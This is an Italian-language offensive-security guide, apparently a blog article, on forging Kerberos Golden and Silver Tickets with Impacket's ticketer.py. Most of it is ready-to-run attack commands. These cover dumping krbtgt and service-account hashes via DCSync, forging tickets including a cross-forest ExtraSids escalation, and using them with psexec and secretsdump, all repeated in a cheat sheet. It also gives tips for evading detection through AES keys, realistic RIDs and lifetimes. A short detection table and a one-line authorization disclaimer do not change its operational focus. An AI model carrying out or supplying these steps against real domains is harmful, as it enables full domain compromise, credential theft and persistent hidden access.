---
title: 'ticketer.py: Golden e Silver Ticket Kerberos con Impacket'
slug: ticketer
description: 'Guida a impacket-ticketer per forgiare Golden e Silver Ticket Kerberos con hash NTLM o chiavi AES, personalizzare il PAC e salvare ticket ccache.'
image: /ticketer-py-golden-silver-ticket-kerberos.webp
draft: true
date: 2026-08-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - impacket
  - ticketer
  - kerberos
  - golden-ticket
  - silver-ticket
---

# ticketer.py — Forgia Golden e Silver Ticket Kerberos con Impacket

`ticketer.py` forgia ticket Kerberos localmente senza contattare il DC — se hai l'hash di `krbtgt` crei un Golden Ticket valido per qualsiasi servizio del dominio; se hai l'hash di un account di servizio crei un Silver Ticket valido per quel servizio specifico. Nessun traffico verso il DC, tutto offline.

`ticketer.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è lo strumento per la **persistenza a lungo termine** in un dominio compromesso. La differenza fondamentale rispetto a [getTGT.py](https://hackita.it/articoli/gettgt/) — che richiede un ticket legittimo al DC — è che ticketer.py costruisce il ticket da zero localmente, manipolando il PAC (Privilege Attribute Certificate) a piacimento.

Sorgente verificato: [fortra/impacket — ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

***

## Golden Ticket vs Silver Ticket — la differenza

Prima dei comandi, il concetto. Entrambi sono ticket forgiati ma cifrati con chiavi diverse e con scope diversi:

|                | Golden Ticket                               | Silver Ticket                                    |
| -------------- | ------------------------------------------- | ------------------------------------------------ |
| Cifrato con    | Hash di `krbtgt`                            | Hash dell'account di servizio                    |
| Tipo di ticket | TGT — valido per richiedere qualsiasi ST    | ST — valido solo per il servizio target          |
| Scope          | Accesso a qualsiasi servizio del dominio    | Accesso solo al servizio specifico               |
| Passa dal DC   | No — il ticket viene accettato direttamente | No — il servizio lo valida con la propria chiave |
| Prerequisito   | Hash `krbtgt` (via DCSync o NTDS dump)      | Hash account di servizio (via dump locale)       |
| Flag ticketer  | Nessun `-spn`                               | `-spn SERVICE/HOST`                              |

Il Golden Ticket sopravvive al cambio password dell'utente impersonato. Viene invalidato solo se `krbtgt` viene resettato **due volte** di fila. In pratica, nei domini reali `krbtgt` non viene mai resettato → persistenza per mesi o anni.

***

## Prerequisiti

### Per il Golden Ticket — ottieni hash krbtgt e SID dominio

```bash
# Hash krbtgt via DCSync (se sei DA o hai DCSync rights)
impacket-secretsdump -just-dc-user krbtgt \
  corp.local/administrator:Password123@DC01.corp.local
# → krbtgt:502:aad3b435...:NThashKrbtgt:::
# → krbtgt:aes256-cts-hmac-sha1-96:AES256KeyKrbtgt

# SID del dominio (da lookupsid o whoami /user da Windows)
impacket-lookupsid corp.local/user:pass@DC01.corp.local | grep "Domain SID"
# → [*] Domain SID is: S-1-5-21-2725560159-1428537661-1240357446

# Alternativa: da secretsdump il SID è stampato nell'output
```

### Per il Silver Ticket — ottieni hash account di servizio

```bash
# Esempio: hash dell'account che gestisce il servizio MSSQLSvc
impacket-secretsdump corp.local/administrator:pass@DC01.corp.local \
  | grep svc_sql
# → svc_sql:1104:aad3b435...:NThashSvcSql:::

# Oppure da dump SAM locale del server su cui gira il servizio
impacket-secretsdump -sam SAM -system SYSTEM LOCAL | grep -i sql
```

***

## Tutti i flag spiegati

```bash
impacket-ticketer [opzioni] NOMEUTENTE
```

`NOMEUTENTE` è il nome che apparirà nel ticket — può essere qualsiasi stringa, anche `nonexistentuser`. Il ticket viene accettato perché il DC non lo valida (la firma crittografica è valida, il contenuto non viene verificato).

| Flag                  | Descrizione                                                                                                                             |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `-nthash HASH`        | NT hash di krbtgt (Golden) o account servizio (Silver). Ticket cifrato in RC4.                                                          |
| `-aesKey KEY`         | Chiave AES (128 o 256 bit). Alternativa a `-nthash`, ticket cifrato in AES.                                                             |
| `-domain-sid SID`     | SID del dominio — **obbligatorio**                                                                                                      |
| `-domain FQDN`        | FQDN del dominio (es. `corp.local`) — **obbligatorio**                                                                                  |
| `-spn SERVICE/HOST`   | Se specificato → Silver Ticket per quel servizio. Se omesso → Golden Ticket.                                                            |
| `-user-id RID`        | RID dell'utente nel PAC. Default 500 (Administrator). Cambialo se 500 è monitorato.                                                     |
| `-groups ID1,ID2,...` | Group ID nel PAC. Default: `513,512,520,518,519` (Domain Users + DA + Enterprise Admins + Schema Admins + Group Policy Creator Owners). |
| `-extra-sid SID`      | SID aggiuntivo nel PAC — usato per ExtraSids attack cross-forest.                                                                       |
| `-duration ORE`       | Validità del ticket in ore. Default: 87600 (10 anni).                                                                                   |
| `-request`            | Clona un ticket reale dal DC e modifica solo i campi specificati. Richiede `-user` e `-password`.                                       |
| `-user UTENTE`        | Utente valido per autenticarsi al DC in modalità `-request`.                                                                            |
| `-password PASS`      | Password per `-request`.                                                                                                                |
| `-dc-ip IP`           | IP del DC — necessario con `-request`.                                                                                                  |

***

## Golden Ticket

### Con NT hash (RC4 — più comune)

```bash
impacket-ticketer \
  -nthash NThashKrbtgtQUI \
  -domain-sid S-1-5-21-2725560159-1428537661-1240357446 \
  -domain corp.local \
  Administrator
# → [*] Saving ticket in Administrator.ccache

export KRB5CCNAME=Administrator.ccache

# Usa il ticket — deve essere FQDN, non IP
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC01.corp.local
```

### Con AES256 (più stealth — mimics comportamento normale)

RC4 nel TGT è anomalo su ambienti moderni che usano AES di default. Con la chiave AES il ticket è indistinguibile da uno legittimo.

```bash
impacket-ticketer \
  -aesKey AES256KeyKrbtgtQUI \
  -domain-sid S-1-5-21-2725560159-1428537661-1240357446 \
  -domain corp.local \
  Administrator
```

### Con entrambi (necessario in modalità `-request`)

```bash
# -request usa un TGT reale come template → deve rispettare l'algoritmo usato dal DC
# Se il DC usa AES, serve specificare entrambe le chiavi
impacket-ticketer \
  -nthash NThashKrbtgt \
  -aesKey AES256KeyKrbtgt \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -request \
  -user lowpriv \
  -password LowPrivPass \
  -dc-ip 10.10.10.5 \
  Administrator
```

***

## Flag avanzati

### `-user-id` — cambia il RID nel PAC

Di default il ticket ha RID 500 (Administrator built-in). Su ambienti con detection avanzata, TGT con RID 500 ma nome utente diverso da `Administrator` è un IoC. Puoi impostare il RID di un utente reale.

```bash
# Usa il RID di un utente esistente nel dominio (es. john.doe ha RID 1103)
impacket-ticketer \
  -nthash NThashKrbtgt \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -user-id 1103 \
  john.doe
```

### `-groups` — manipola i gruppi nel PAC

Il PAC contiene la lista dei gruppi di cui fa parte l'utente. Puoi metterci quello che vuoi.

```bash
# RID dei gruppi principali:
# 512 = Domain Admins
# 513 = Domain Users
# 518 = Schema Admins
# 519 = Enterprise Admins
# 520 = Group Policy Creator Owners
# 544 = BUILTIN\Administrators

# Default già include 512, 513, 519, 518, 520 — ma puoi personalizzare
impacket-ticketer \
  -nthash NThashKrbtgt \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -groups 512,513,518,519,520 \
  Administrator
```

### `-extra-sid` — ExtraSids attack cross-forest

Questo è l'uso più avanzato. Se hai una forest trust tra `child.corp.local` e `corp.local`, puoi aggiungere il SID di Enterprise Admins del dominio root nel campo `ExtraSids` del ticket. Il DC del dominio root accetta il ticket perché i SID nelle trust vengono valutati diversamente.

```bash
# Per un attacco cross-forest child → root:
# SID Enterprise Admins del root: S-1-5-21-ROOT-SID-519

impacket-ticketer \
  -nthash NThashKrbtgtChild \
  -domain-sid S-1-5-21-CHILD-DOMAIN-SID \
  -domain child.corp.local \
  -extra-sid S-1-5-21-ROOT-DOMAIN-SID-519 \
  Administrator
# → ticket con ExtraSids che include Enterprise Admins del dominio root
# → accesso come EA nel dominio padre
```

### `-duration` — validità del ticket

Il Golden Ticket di default dura 10 anni. Su ambienti con monitoring Kerberos, un ticket con lifetime estremo è un IoC. Puoi ridurlo per sembrare legittimo (default legittimo: 10 ore).

```bash
impacket-ticketer \
  -nthash NThashKrbtgt \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -duration 10 \
  Administrator
```

***

## Silver Ticket

Il Silver Ticket è più stealth del Golden perché non genera traffico verso il DC neanche quando viene usato — il servizio valida il ticket con la propria chiave senza chiedere al DC. Contropartita: vale solo per il servizio specifico.

```bash
# Silver Ticket per CIFS (file share / psexec) su SRV01
impacket-ticketer \
  -nthash NThashSvcSql \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass corp.local/Administrator@sql01.corp.local

# Silver Ticket per HOST/CIFS su un server specifico
impacket-ticketer \
  -nthash NThashMachineAccount \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -spn cifs/SRV01.corp.local \
  Administrator

impacket-smbclient -k -no-pass corp.local/Administrator@SRV01.corp.local

# Silver Ticket per LDAP (DCSync senza Event 4662 su DC)
impacket-ticketer \
  -nthash NThashDCMachineAccount \
  -domain-sid S-1-5-21-XXXX \
  -domain corp.local \
  -spn ldap/DC01.corp.local \
  Administrator

impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC01.corp.local
```

**Service class per Silver Ticket — le più utili:**

| SPN                  | Accesso                                  |
| -------------------- | ---------------------------------------- |
| `cifs/HOST`          | File share, psexec, smbclient            |
| `host/HOST`          | WMI, WinRM, task remoti                  |
| `http/HOST`          | IIS, SharePoint, Exchange                |
| `MSSQLSvc/HOST:PORT` | SQL Server                               |
| `ldap/HOST`          | DCSync (meno rumoroso del Golden Ticket) |
| `rpcss/HOST`         | DCOM, WMI                                |

***

## Detection

Il Golden Ticket è storicamente difficile da rilevare perché il DC non partecipa alla validazione. Le anomalie più cercate:

| Indicatore                                                     | Cosa rivela                                       |
| -------------------------------------------------------------- | ------------------------------------------------- |
| TGT con lifetime anomalo (anni)                                | Golden Ticket con `-duration` di default          |
| TGT con RC4 su ambienti AES-only                               | Ticket forgiato con NT hash invece di AES key     |
| Utente mai visto nei log di logon precedenti ma con DA nel PAC | Nome inventato nel ticket                         |
| Event 4769 senza 4768 precedente                               | Uso di Silver Ticket — nessun TGT richiesto al DC |
| SID history con Enterprise Admins di un altro dominio          | ExtraSids cross-forest                            |

Microsoft Defender for Identity ha regole specifiche per Golden Ticket detection che analizzano le anomalie nel PAC e nel lifetime dei ticket.

***

## Cheat Sheet

```bash
# === Ottieni i prerequisiti ===
# Hash krbtgt
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@DC01.corp.local

# SID dominio
impacket-lookupsid corp.local/user:pass@DC01.corp.local | grep "Domain SID"

# === Golden Ticket (RC4) ===
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXX \
  -domain corp.local Administrator

# Golden Ticket (AES — più stealth)
impacket-ticketer -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-XXX \
  -domain corp.local Administrator

# Golden Ticket con lifetime realistico
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXX \
  -domain corp.local -duration 10 Administrator

# ExtraSids cross-forest
impacket-ticketer -nthash KRBTGT_CHILD_NTHASH -domain-sid S-1-5-21-CHILD-XXX \
  -domain child.corp.local -extra-sid S-1-5-21-ROOT-XXX-519 Administrator

# === Silver Ticket ===
# CIFS
impacket-ticketer -nthash SVC_NTHASH -domain-sid S-1-5-21-XXX \
  -domain corp.local -spn cifs/TARGET.corp.local Administrator

# MSSQL
impacket-ticketer -nthash SVC_NTHASH -domain-sid S-1-5-21-XXX \
  -domain corp.local -spn MSSQLSvc/sql01.corp.local:1433 Administrator

# LDAP (DCSync meno rumoroso)
impacket-ticketer -nthash DC_MACHINE_NTHASH -domain-sid S-1-5-21-XXX \
  -domain corp.local -spn ldap/DC01.corp.local Administrator

# === Usa il ticket ===
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC01.corp.local
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
* [Golden Ticket: persistenza nel dominio](https://hackita.it/articoli/golden-ticket/)
* [Silver Ticket: accesso al servizio](https://hackita.it/articoli/silver-ticket/)
* [DCSync: ottieni hash krbtgt](https://hackita.it/articoli/dcsync/)
* [lookupsid.py — ottieni il SID del dominio](https://hackita.it/articoli/lookupsid/)
* [getTGT.py — ticket legittimo da hash](https://hackita.it/articoli/gettgt/)
* [getST.py — S4U e delegation](https://hackita.it/articoli/getst/)
* [Mimikatz — dump krbtgt da LSASS](https://hackita.it/articoli/mimikatz/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #kerberos #active-directory #persistence
